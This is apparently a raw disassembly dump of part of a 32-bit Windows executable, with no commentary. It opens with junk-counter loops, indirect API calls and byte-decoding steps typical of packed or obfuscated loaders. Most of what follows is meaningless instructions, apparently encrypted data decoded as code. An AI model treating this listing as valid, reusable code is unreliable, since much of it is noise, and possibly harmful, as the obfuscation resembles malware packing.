  41028b:	mov    DWORD PTR ds:0x43372b,ecx
  410291:	cmp    DWORD PTR ds:0x43372b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43372b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43372b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43372b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43372b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433683
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433767,0x43371f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433763,0x433717
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4336d7
  41031a:	sub    DWORD PTR ds:0x43369f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4336db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4336db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4336db,ecx
  410345:	cmp    DWORD PTR ds:0x4336db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43382f
  410357:	push   0x43386f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4336db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43371f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433793,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433793
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433793,ecx
  41038f:	cmp    DWORD PTR ds:0x433793,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433767
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433793,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433793
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433793,ecx
  4103c8:	cmp    DWORD PTR ds:0x433793,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4336df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4336d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4336d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4336d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4336d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4336d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x3d,al
  41049c:	pop    esi
  41049d:	scas   al,BYTE PTR es:[edi]
  41049e:	pop    edi
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	lods   al,BYTE PTR ds:[esi]
  4104a8:	outs   dx,BYTE PTR ds:[esi]
  4104a9:	sahf   
  4104aa:	push   cs
  4104ab:	inc    ebp
  4104ac:	test   BYTE PTR [edi],0x71
  4104af:	rcr    DWORD PTR [ecx],0xf9
  4104b2:	shr    DWORD PTR [ecx+eiz*2-0x6a],0xc
  4104b7:	int    0x7b
  4104b9:	adc    ecx,eax
  4104bb:	jb     0x4104b6
  4104bd:	mov    DWORD PTR [ecx+esi*4-0x1f],edi
  4104c1:	ror    DWORD PTR [esp+ebp*8-0x6e5d0d49],0x73
  4104c9:	pop    ss
  4104ca:	adc    dh,BYTE PTR [ebx]
  4104cc:	mov    cl,0x86
  4104ce:	into   
  4104cf:	jmp    0x6c38:0x5faf4540
  4104d6:	cmp    al,0x19
  4104d8:	fisttp WORD PTR [ebp+0x33]
  4104db:	nop
  4104dc:	mov    esp,0x4dc360d
  4104e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e2:	xor    eax,0x45fcd175
  4104e7:	(bad)  
  4104e8:	and    eax,DWORD PTR [ebx+0x58]
  4104eb:	pop    esp
  4104ec:	or     DWORD PTR [edx-0x47a17a1],ebx
  4104f2:	dec    ebp
  4104f3:	stos   DWORD PTR es:[edi],eax
  4104f4:	dec    esi
  4104f5:	rol    DWORD PTR [edi+0x4bd731e4],cl
  4104fb:	xor    al,0x6a
  4104fd:	ret    
  4104fe:	xchg   DWORD PTR [esi+0x3b],esi
  410501:	cdq    
  410502:	scas   eax,DWORD PTR es:[edi]
  410503:	mul    BYTE PTR [ebx+0x27]
  410506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410507:	adc    ecx,ebp
  410509:	iret   
  41050a:	stos   BYTE PTR es:[edi],al
  41050b:	sbb    al,0x73
  41050d:	dec    esi
  41050e:	mov    ecx,0xe6587cfc
  410513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410514:	inc    ebx
  410515:	xchg   BYTE PTR [ebx],dh
  410517:	in     al,dx
  410518:	and    eax,0x8bc1ea27
  41051d:	pop    edi
  41051e:	into   
  41051f:	pusha  
  410520:	lock ret 0xb12a
  410524:	jns    0x41051c
  410526:	sub    BYTE PTR [ecx+0x21],0x61
  41052a:	test   BYTE PTR [eax-0x6f],cl
  41052d:	rol    DWORD PTR [eax],cl
  41052f:	hlt    
  410530:	sbb    esi,DWORD PTR [edx]
  410532:	aam    0x43
  410534:	pop    edi
  410535:	in     eax,dx
  410536:	iret   
  410537:	cdq    
  410538:	mov    dx,0x4d26
  41053c:	(bad)  
  41053d:	cmc    
  41053e:	mov    ecx,0x4ec80b13
  410543:	(bad)  
  410545:	out    0x2,eax
  410547:	adc    eax,0x984709cf
  41054c:	pop    edx
  41054d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41054e:	inc    ebp
  41054f:	test   al,0x57
  410551:	push   esi
  410552:	imul   BYTE PTR [ecx+0x1e92c71c]
  410558:	sahf   
  410559:	and    esp,DWORD PTR [ebp-0x6c376452]
  41055f:	or     DWORD PTR [ecx-0x48],0x0
  410563:	fbld   TBYTE PTR [edi]
  410565:	test   eax,0xcc0e35f1
  41056a:	jmp    FWORD PTR [esi]
  41056c:	pushf  
  41056d:	adc    al,0xa1
  41056f:	scas   al,BYTE PTR es:[edi]
  410570:	mov    ah,bh
  410572:	das    
  410573:	jmp    0x7c09125c
  410578:	repz add al,cl
  41057b:	adc    al,0x46
  41057d:	mov    edi,DWORD PTR [esi+edi*1+0x158c7de0]
  410584:	xchg   ah,bl
  410586:	cli    
  410587:	mov    WORD PTR [ecx],es
  410589:	cpuid  
  41058b:	jmp    0x4105e9
  41058d:	stos   DWORD PTR es:[edi],eax
  41058e:	pushf  
  41058f:	or     al,0x51
  410591:	inc    edi
  410592:	jmp    0x6b100090
  410597:	outs   dx,DWORD PTR ds:[esi]
  410598:	jne    0x4105c0
  41059a:	and    eax,0x2b924ae2
  41059f:	sbb    DWORD PTR [edi-0x13],esp
  4105a2:	pusha  
  4105a3:	mov    ecx,0x4c4df54d
  4105a8:	outs   dx,BYTE PTR ds:[esi]
  4105a9:	adc    al,0xf2
  4105ab:	dec    ebx
  4105ac:	into   
  4105ad:	adc    ch,ah
  4105af:	fucomip st,st(5)
  4105b1:	inc    ebp
  4105b2:	outs   dx,DWORD PTR ds:[esi]
  4105b3:	push   cs
  4105b4:	(bad)  
  4105b5:	pop    ecx
  4105b6:	ret    0xe7f1
  4105b9:	shl    ch,cl
  4105bb:	inc    edi
  4105bc:	aaa    
  4105bd:	dec    ecx
  4105be:	inc    edi
  4105bf:	sub    eax,0xd7056412
  4105c4:	mov    ds:0xda8a2c6,eax
  4105c9:	daa    
  4105ca:	mov    bl,0x42
  4105cc:	xor    edi,eax
  4105ce:	jl     0x4105a2
  4105d0:	popa   
  4105d1:	repz mov cl,0xd4
  4105d4:	push   0x41
  4105d6:	ds inc ebx
  4105d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105d9:	and    DWORD PTR [eax],eax
  4105db:	fisubr DWORD PTR [ebx+ebp*1+0x42]
  4105df:	loop   0x410579
  4105e1:	ss mov ebp,0x18bf116e
  4105e7:	ror    DWORD PTR [esi-0x6a],1
  4105ea:	scas   al,BYTE PTR es:[edi]
  4105eb:	mov    ebx,0x31024447
  4105f0:	out    0xaf,al
  4105f2:	(bad)  
  4105f3:	ins    DWORD PTR es:[edi],dx
  4105f4:	and    edx,ecx
  4105f6:	pop    es
  4105f7:	mov    ebx,0x598c7f0a
  4105fc:	cmp    DWORD PTR [ecx-0x66db8d35],0xf4180057
  410606:	and    al,0x2b
  410608:	fidiv  DWORD PTR [esi]
  41060a:	vmread DWORD PTR [esp+eiz*8+0x63b27717],ebx
  410612:	sar    BYTE PTR [esi-0x17],cl
  410615:	loope  0x4105a6
  410617:	xchg   esi,eax
  410618:	sbb    DWORD PTR [ebx+0x1d],edi
  41061b:	leave  
  41061c:	mov    bl,0xfc
  41061e:	and    al,0x5b
  410620:	test   eax,0x4db05a1d
  410625:	mov    ds:0xa6131011,al
  41062a:	cs push edi
  41062c:	pushf  
  41062d:	mov    ch,0x65
  41062f:	xchg   ebp,eax
  410630:	loopne 0x4105ba
  410632:	sbb    eax,DWORD PTR [ebx]
  410634:	inc    ecx
  410635:	mov    eax,DWORD PTR [edi+0xe48fea6]
  41063b:	clc    
  41063c:	adc    al,0xf5
  41063e:	shl    ebx,0x6a
  410641:	adc    bh,cl
  410643:	jmp    0x59d1dbd5
  410648:	or     DWORD PTR [eax-0x2ffe5c0b],esp
  41064e:	cmc    
  41064f:	ss xchg edi,eax
  410651:	shr    DWORD PTR [edx+edi*1],1
  410654:	jbe    0x41069a
  410656:	std    
  410657:	lods   eax,DWORD PTR ss:[esi]
  410659:	jns    0x41066c
  41065b:	cld    
  41065c:	and    eax,0xbe41d421
  410661:	(bad)  
  410662:	js     0x410692
  410664:	jmp    0x1cf2:0x70a5809e
  41066b:	gs xor esi,DWORD PTR gs:[edi-0x15]
  410670:	scas   al,BYTE PTR es:[edi]
  410671:	add    eax,0xab0697ef
  410676:	push   esp
  410677:	jnp    0x410609
  410679:	sbb    BYTE PTR [esi],bl
  41067b:	jge    0x41067a
  41067d:	ret    0xe426
  410680:	movmskps esi,xmm4
  410683:	cdq    
  410684:	adc    BYTE PTR [esi+0x48f2282e],bl
  41068a:	jo     0x4106a8
  41068c:	inc    ecx
  41068d:	lahf   
  41068e:	fimul  WORD PTR [eax-0x52369615]
  410694:	sbb    BYTE PTR [ebp+0x413c0f5],bh
  41069a:	ret    0x7d9f
  41069d:	fdivr  DWORD PTR [edx]
  41069f:	scas   eax,DWORD PTR es:[edi]
  4106a0:	mov    edx,0x239b7300
  4106a5:	xor    al,0x92
  4106a7:	dec    edi
  4106a8:	dec    eax
  4106a9:	dec    eax
  4106aa:	jle    0x410688
  4106ac:	shl    ecx,1
  4106ae:	jo     0x410701
  4106b0:	adc    ah,cl
  4106b2:	xchg   ebx,eax
  4106b3:	lods   al,BYTE PTR ds:[esi]
  4106b4:	mov    eax,ds:0xc7a79043
  4106b9:	imul   ecx,DWORD PTR [edx],0xe1a35065
  4106bf:	pop    esi
  4106c0:	cs xchg ebp,eax
  4106c2:	repnz xlat BYTE PTR ds:[ebx]
  4106c4:	test   eax,0x1b18c4b9
  4106c9:	sbb    BYTE PTR [ebx],ah
  4106cb:	es xchg ebp,eax
  4106cd:	adc    eax,0x8fa3c81e
  4106d2:	or     BYTE PTR [ecx+0x42],0x31
  4106d6:	in     al,0xf1
  4106d8:	add    DWORD PTR [edi],esp
  4106da:	pop    esi
  4106db:	push   0xe60d0458
  4106e0:	or     DWORD PTR [ebx-0x6da95bb9],0xffffffa5
  4106e7:	adc    DWORD PTR [eax+0xb],0xffffffa6
  4106eb:	or     dl,ch
  4106ed:	xchg   ebx,eax
  4106ee:	mov    eax,0xab702d32
  4106f3:	mov    cl,0xcb
  4106f5:	and    al,0x81
  4106f7:	inc    ebp
  4106f8:	cwde   
  4106f9:	enter  0xd798,0x86
  4106fd:	cmp    eax,0x65e8a9d9
  410702:	cwde   
  410703:	jo     0x41071c
  410705:	adc    dh,BYTE PTR [ebx+0x79]
  410708:	or     eax,edi
  41070a:	(bad)  
  41070b:	sbb    DWORD PTR [edi+0x6217bf75],ebp
  410711:	mov    ebp,0xbf22cb46
  410716:	xchg   ebx,eax
  410717:	mov    esp,0xa3805a3f
  41071c:	out    dx,al
  41071d:	or     eax,0xcf8efccb
  410722:	dec    esi
  410723:	in     eax,0xc1
  410725:	daa    
  410726:	lods   eax,DWORD PTR ds:[esi]
  410727:	js     0x410760
  410729:	popf   
  41072a:	jge    0x410770
  41072c:	out    dx,eax
  41072d:	or     dl,BYTE PTR ds:0xb6987c15
  410733:	retf   
  410734:	mov    ebp,0x5539e92e
  410739:	out    0xc0,eax
  41073b:	lea    edi,[edx+0x3c544b07]
  410741:	leave  
  410742:	mov    bl,0x62
  410744:	das    
  410745:	(bad)  
  410746:	popf   
  410747:	pop    edx
  410748:	div    DWORD PTR [esi]
  41074a:	repnz inc eax
  41074c:	mov    WORD PTR [esi+0x5fb6eb67],es
  410752:	lea    esi,es:[ebx-0x74368dfa]
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x618003e1
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107f4
  41078c:	push   eax
  41078d:	jecxz  0x410781
  41078f:	es je  0x410725
  410792:	retf   
  410793:	fld    st(3)
  410795:	and    BYTE PTR [esi-0x2713db25],al
  41079b:	loope  0x41077b
  41079d:	mov    esi,0xab11e02b
  4107a2:	mov    al,ds:0xd95038c6
  4107a7:	push   esi
  4107a8:	pop    edi
  4107aa:	ins    DWORD PTR es:[edi],dx
  4107ab:	inc    esi
  4107ac:	test   DWORD PTR [ebp+ebx*8-0x4d],ebx
  4107b0:	rcl    DWORD PTR [ebx+0x64],cl
  4107b3:	add    esp,esp
  4107b5:	dec    eax
  4107b6:	dec    ecx
  4107b7:	xor    DWORD PTR [esi+0x72a9dcfa],ebx
  4107bd:	int3   
  4107be:	rol    esi,0x45
  4107c1:	aam    0x98
  4107c3:	xor    DWORD PTR [ebp+0x7d69dabb],esp
  4107c9:	jecxz  0x410753
  4107cb:	or     esi,ecx
  4107cd:	call   0xadc9:0xe91aa136
  4107d4:	mov    ah,0x46
  4107d6:	xchg   ecx,eax
  4107d7:	push   ds
  4107d8:	mov    ah,0xc2
  4107da:	inc    esp
  4107db:	cld    
  4107dc:	pop    esp
  4107dd:	push   ebp
  4107de:	inc    edx
  4107df:	and    bh,BYTE PTR [esi+0x3d]
  4107e2:	jnp    0x4107dd
  4107e4:	jae    0x41082b
  4107e6:	dec    ecx
  4107e7:	repz mov ecx,0x29c8b3e2
  4107ed:	xor    al,0x4b
  4107ef:	in     eax,dx
  4107f0:	inc    ebx
  4107f1:	jbe    0x4107a7
  4107f3:	out    dx,al
  4107f4:	xor    ah,ah
  4107f6:	arpl   WORD PTR ds:[edi-0x30],bp
  4107fa:	mov    bl,0xc2
  4107fc:	stc    
  4107fd:	inc    edi
  4107fe:	cld    
  4107ff:	and    eax,0x9e7cd1e5
  410804:	push   ecx
  410805:	xchg   ebx,eax
  410806:	xor    DWORD PTR [bx+si-0x6],edi
  41080a:	xor    dl,BYTE PTR [ebx]
  41080c:	(bad)  
  41080d:	and    ebx,DWORD PTR gs:[bx+si]
  410811:	loop   0x4107d9
  410813:	scas   eax,DWORD PTR es:[edi]
  410814:	sbb    al,0xf0
  410816:	icebp  
  410817:	mov    ebx,0x7913f858
  41081c:	xchg   edx,eax
  41081d:	mov    al,0x4c
  41081f:	xor    ebp,DWORD PTR [edi+0x7f]
  410822:	fwait
  410823:	outs   dx,DWORD PTR ds:[esi]
  410824:	dec    ebx
  410825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410826:	repz aam 0x74
  410829:	jae    0x410802
  41082b:	clc    
  41082c:	out    0xb4,eax
  41082e:	mov    al,ds:0xd9116963
  410833:	push   ds
  410834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410835:	xchg   DWORD PTR [ecx-0x26037c49],ecx
  41083b:	inc    edx
  41083c:	fild   WORD PTR [edi]
  41083e:	mov    eax,0x284e829d
  410843:	(bad)  
  410844:	call   0x75087945
  410849:	push   0xffffffeb
  41084b:	mov    BYTE PTR [edi],dl
  41084d:	addr16 mov ebx,0xd15ad5d4
  410853:	jbe    0x410853
  410855:	xor    eax,0x61c13d25
  41085a:	xlat   BYTE PTR ds:[ebx]
  41085b:	fwait
  41085c:	shl    dh,1
  41085e:	and    eax,0x24579c74
  410863:	sub    DWORD PTR [edx],esp
  410865:	(bad)  
  410866:	nop
  410867:	sub    eax,0x34c1e549
  41086c:	pop    ds
  41086d:	call   0xfeca:0xe2fb7f5
  410874:	sub    eax,0xac143434
  410879:	test   al,0x3c
  41087b:	xchg   dl,al
  41087d:	mov    dh,cl
  41087f:	outs   dx,DWORD PTR ds:[esi]
  410880:	daa    
  410881:	arpl   di,bp
  410883:	dec    esi
  410884:	(bad)  
  410885:	and    cl,bl
  410887:	repz mov WORD PTR [ebp-0x2f],gs
  41088b:	sahf   
  41088c:	mov    al,0xf7
  41088e:	ror    BYTE PTR [esi],1
  410890:	jmp    0xca36:0xc03ec7da
  410897:	jns    0x4108a2
  410899:	sub    al,0x87
  41089b:	fisttp DWORD PTR [edi]
  41089d:	sbb    dl,BYTE PTR [eax-0x46a8da2f]
  4108a3:	mov    DWORD PTR [edx+0x6542bf9d],ebp
  4108a9:	inc    ebx
  4108aa:	lods   eax,DWORD PTR ds:[esi]
  4108ab:	pop    eax
  4108ac:	in     eax,0x1e
  4108ae:	retf   0x209f
  4108b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108b2:	rol    esi,cl
  4108b4:	adc    BYTE PTR [ebx-0x6ba20975],0xef
  4108bb:	pop    ebx
  4108bc:	jge    0x41093a
  4108be:	mov    cl,0x57
  4108c0:	push   esp
  4108c1:	pop    ss
  4108c2:	and    dh,BYTE PTR ds:0xf7f94ad8
  4108c8:	(bad)  
  4108ca:	mov    ds:0xb41ddd0,al
  4108cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d0:	xchg   ebx,eax
  4108d1:	mov    bl,0x6d
  4108d3:	loop   0x410905
  4108d5:	xchg   DWORD PTR [ebp+0x6c33ae8f],esi
  4108db:	push   ds
  4108dc:	rcl    BYTE PTR [eax+0x5bb1a38f],cl
  4108e2:	test   al,0x16
  4108e4:	and    esp,ecx
  4108e6:	inc    esp
  4108e7:	cli    
  4108e8:	xlat   BYTE PTR ds:[ebx]
  4108e9:	les    ecx,FWORD PTR [ebp+0x40219e53]
  4108ef:	or     DWORD PTR ds:0x3bb007f3,0x51
  4108f6:	and    eax,0xf8cc8792
  4108fb:	sbb    al,0x9b
  4108fd:	retf   0x85ed
  410900:	add    al,BYTE PTR [eax*1+0x4e647557]
  410907:	adc    al,0x5d
  410909:	idiv   ecx
  41090b:	inc    esp
  41090c:	(bad)  
  41090d:	pop    edx
  41090e:	and    BYTE PTR [eax],ah
  410910:	test   BYTE PTR [eax-0x27b9a4ca],cl
  410916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410917:	and    edi,DWORD PTR [ebx]
  410919:	ins    BYTE PTR es:[edi],dx
  41091a:	or     al,0x9b
  41091c:	cmp    al,0xc8
  41091e:	fnclex 
  410920:	adc    al,0xd6
  410922:	loop   0x410946
  410924:	inc    esp
  410925:	pop    eax
  410926:	neg    DWORD PTR [eax-0x5]
  410929:	jmp    0xfcce:0x71b912d7
  410930:	fwait
  410931:	mov    ecx,0xc5194749
  410936:	push   edx
  410938:	retf   0xa2c
  41093b:	adc    DWORD PTR [edx-0x4d],ebp
  41093e:	rol    BYTE PTR [ecx-0x71],1
  410941:	jecxz  0x4108d4
  410943:	mov    bl,0x80
  410945:	adc    BYTE PTR [edx+0x3c0806de],ah
  41094b:	add    eax,0xd7477816
  410950:	int    0xd
  410952:	push   0xffffffbe
  410954:	in     eax,dx
  410955:	or     al,0x9a
  410957:	or     dl,BYTE PTR [ecx-0x473ce224]
  41095d:	rol    DWORD PTR ds:0x1fd619b,0x3e
  410964:	xor    ch,BYTE PTR [ebx+0x8]
  410967:	adc    eax,0xa32c8ab9
  41096c:	inc    eax
  41096d:	stc    
  41096e:	(bad)  
  41096f:	imul   eax,DWORD PTR [edx-0x4f],0x528cc4f5
  410976:	out    dx,al
  410977:	rcl    BYTE PTR [ecx-0x39],1
  41097a:	rol    esi,1
  41097c:	jge    0x4109f3
  41097e:	push   cs
  41097f:	pop    edi
  410980:	fsubr  DWORD PTR [esi]
  410982:	sub    al,BYTE PTR [edi]
  410984:	enter  0xa96d,0x9f
  410988:	sub    BYTE PTR [ebx],ah
  41098a:	pop    edx
  41098b:	sub    edx,DWORD PTR [edi]
  41098d:	lea    ebx,[edi-0x2e]
  410990:	in     eax,0xd4
  410992:	mov    esp,0x28b37107
  410997:	out    0xd,eax
  410999:	cmp    al,0xfc
  41099b:	sti    
  41099c:	sub    esi,ecx
  41099e:	scas   al,BYTE PTR es:[edi]
  41099f:	mov    dl,ah
  4109a1:	sbb    eax,0xaf165115
  4109a6:	stos   BYTE PTR es:[edi],al
  4109a7:	ret    
  4109a8:	mov    ecx,0x67f24ffa
  4109ad:	adc    dl,al
  4109af:	imul   ecx,DWORD PTR [ecx-0x5ea37fad],0x62
  4109b6:	or     bl,al
  4109b8:	cmp    al,0xc2
  4109ba:	and    ebx,ebp
  4109bc:	xchg   bh,cl
  4109be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109bf:	ret    0x3a
  4109c2:	out    dx,eax
  4109c3:	jge    0x410973
  4109c5:	stos   DWORD PTR es:[edi],eax
  4109c6:	out    0xc1,al
  4109c8:	mov    ds,WORD PTR [ebp+0x60ea4e5]
  4109ce:	aas    
  4109cf:	imul   edx,DWORD PTR [esi-0x7de7901a],0xbe532a4f
  4109d9:	add    BYTE PTR [eax-0x21],dh
  4109dc:	test   DWORD PTR ds:0xc790e07d,0x13bd4f06
  4109e6:	std    
  4109e7:	xlat   BYTE PTR ds:[ebx]
  4109e8:	int3   
  4109e9:	and    bp,WORD PTR [eax-0x4f]
  4109ed:	mov    eax,DWORD PTR [ebx-0x3f8be74e]
  4109f3:	mov    ?,ebp
  4109f5:	xor    DWORD PTR [edi+0x389aa62f],eax
  4109fb:	int    0x7f
  4109fd:	out    dx,eax
  4109fe:	ret    
  4109ff:	je     0x410a80
  410a01:	pop    esp
  410a02:	leave  
  410a03:	add    al,0xfe
  410a05:	add    BYTE PTR [edx],0xdb
  410a08:	adc    BYTE PTR [eax+ebx*8],bh
  410a0b:	daa    
  410a0c:	mov    eax,ds:0x703ea867
  410a11:	fwait
  410a12:	xchg   ecx,eax
  410a13:	adc    DWORD PTR [eax],eax
  410a15:	jnp    0x410a10
  410a17:	imul   eax,DWORD PTR [edx-0x21],0x71
  410a1b:	cmp    DWORD PTR [edi],edi
  410a1d:	cmp    BYTE PTR [edi],0xd3
  410a20:	retf   
  410a21:	stos   DWORD PTR es:[edi],eax
  410a22:	call   0xa451f74a
  410a27:	and    ebp,DWORD PTR [edx]
  410a29:	xchg   esp,eax
  410a2a:	in     al,dx
  410a2b:	xchg   esp,eax
  410a2c:	pop    es
  410a2d:	sti    
  410a2e:	dec    ecx
  410a2f:	fsubr  QWORD PTR [ebx+0xc7f4b77]
  410a35:	clc    
  410a36:	xor    esp,ecx
  410a38:	sub    BYTE PTR [esi],al
  410a3a:	pop    ss
  410a3b:	adc    eax,DWORD PTR [ebx]
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	pop    ebx
  410a50:	mov    DWORD PTR [edi],edx
  410a52:	and    eax,0x7e7ebdba
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a5f
  410a5c:	push   ss
  410a5d:	push   0xffffffef
  410a5f:	cli    
  410a60:	sub    ecx,ebx
  410a62:	mov    eax,ds:0xe4d67755
  410a67:	(bad)  [esi-0xe]
  410a6a:	jge    0x410a66
  410a6c:	adc    bl,ch
  410a6e:	push   ecx
  410a6f:	ins    BYTE PTR es:[edi],dx
  410a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a71:	mov    dl,0x10
  410a73:	nop
  410a74:	sub    ebx,ebp
  410a76:	push   es
  410a77:	(bad)  
  410a78:	loopne 0x410a3f
  410a7a:	xor    ebx,DWORD PTR [ecx]
  410a7c:	xor    DWORD PTR [esi-0x721f3f4c],ebx
  410a82:	add    esp,DWORD PTR [ebx+0x7d]
  410a85:	fistp  QWORD PTR [ecx+0x16]
  410a88:	iret   
  410a89:	jecxz  0x410a0e
  410a8b:	dec    eax
  410a8c:	cmp    BYTE PTR [edi-0x15],cl
  410a8f:	es push 0x5b
  410a92:	out    0x96,al
  410a94:	pop    esi
  410a95:	iret   
  410a96:	xchg   ebx,eax
  410a97:	sub    dh,bh
  410a99:	xor    BYTE PTR [ebx-0x3f4a1e02],bh
  410a9f:	xchg   ecx,eax
  410aa0:	cmp    esi,DWORD PTR [esp+eiz*2]
  410aa3:	daa    
  410aa4:	adc    bh,BYTE PTR [ebx-0x54a4e861]
  410aaa:	xchg   BYTE PTR [edi+0x39],bh
  410aad:	xor    al,bl
  410aaf:	adc    DWORD PTR [edx],esp
  410ab1:	cmc    
  410ab2:	cmc    
  410ab3:	or     cl,bh
  410ab5:	jl     0x410a8c
  410ab7:	imul   BYTE PTR [edx+0x55]
  410aba:	or     al,0x2b
  410abc:	sbb    al,0x86
  410abe:	inc    esp
  410abf:	(bad)  
  410ac0:	xor    edi,DWORD PTR [ebp+0x38]
  410ac3:	bound  esp,QWORD PTR [esi]
  410ac5:	sbb    ebx,esi
  410ac7:	mov    ds:0x7ae6e2af,eax
  410acc:	mov    DWORD PTR [edi+ecx*4-0x70],0x157a7e48
  410ad4:	pop    eax
  410ad5:	mov    cl,0xe3
  410ad7:	lods   eax,DWORD PTR ds:[esi]
  410ad8:	add    edx,DWORD PTR [edx-0x74]
  410adb:	out    0xaf,al
  410add:	cdq    
  410ade:	and    eax,0xc8923c57
  410ae3:	int3   
  410ae4:	dec    ebp
  410ae5:	sub    ecx,edi
  410ae7:	test   BYTE PTR [esi],al
  410ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aea:	sahf   
  410aeb:	mov    WORD PTR [edi],ss
  410aed:	neg    BYTE PTR [ebx+0x2a]
  410af0:	push   edx
  410af1:	lock pop esp
  410af3:	ins    BYTE PTR es:[edi],dx
  410af4:	push   ss
  410af5:	das    
  410af6:	ja     0x410ac2
  410af8:	adc    cl,dl
